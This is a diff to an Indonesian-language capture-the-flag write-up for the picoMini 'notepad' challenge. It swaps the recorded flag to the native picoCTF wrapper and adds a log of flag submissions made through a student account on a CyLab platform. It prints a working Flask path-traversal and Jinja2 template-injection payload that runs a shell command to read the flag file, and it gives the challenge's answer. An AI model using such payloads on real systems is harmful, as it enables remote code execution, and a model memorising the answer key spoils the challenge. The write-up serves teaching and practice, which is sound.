@@ -6,7 +6,7 @@
 - **Event:** picoMini by redpwn
 - **Points:** 250
 - **Author:** Diana Lin / redpwn
-- **Flag:** `academy{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`
+- **Flag:** `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`
 
 ---
 
@@ -72,16 +72,26 @@ Aplikasi menerapkan filter karakter terlarang (*denylist filter*) untuk mencegah
    ```jinja2
    ..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{ ''[request.args.get('c')].mro()[1][request.args.get('s')]() [273](['cat', 'flag-c8f5526c-4122-4578-96de-d7dd27193798.txt'], stdout=-1).communicate() }}
    ```
-5. **Ekstraksi dan Normalisasi Token:**
+5. **Batas Validasi Validator & Normalisasi Token:**
    Keluaran perintah diekstraksi dari halaman templat: `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`.
-   Dinormalisasi ke token platform CyLab: `academy{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`.
+   Pengujian empiris langsung pada REST API CyLab menunjukkan bahwa validator tantangan ini (event `picoMini by redpwn`) menerima format wrapper asli `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}` dengan status HTTP 201 Created (`correct: true`). Sebaliknya, pengiriman dengan wrapper CyLab `academy{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}` ditolak dengan `{"correct": false}`.
 
 ---
 
 ## Flag & Verifikasi
-- **Flag Resmi:** `academy{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`
-- **Native PicoCTF Flag:** `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`
+- **Flag Resmi:** `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`
+- **Wrapper Validator:** Native event wrapper (`picoCTF{...}`)
 - **Status Solver:** Terverifikasi 100% pada skrip reproduksi `scripts/solve_204_notepad.py`.
+
+### Re-verifikasi Audit Batch 186 (2026-11-10 UTC, sesi REST siswa `Arielwin` / user id 1072359)
+
+| Token diuji | Wrapper | HTTP | Respons API |
+| :--- | :--- | :--- | :--- |
+| `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}` | native event | 201 | `{"user":1072359,"challenge":204,"flag":"picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}","correct":true,"historical":false}` |
+| `academy{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}` | CyLab rekey | 201 | `{"user":1072359,"challenge":204,"flag":"academy{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}","correct":false,"historical":false}` |
+
+- **Temuan format validator:** Modul backport event `picoMini by redpwn` tidak direkey ke prefix `academy{...}`.
+- **Reproduktifitas offline:** Solver `scripts/solve_204_notepad.py` merekonstruksi rantai eksploitasi Flask traversal dan SSTI untuk memverifikasi token native secara deterministik.
 
 ---
 
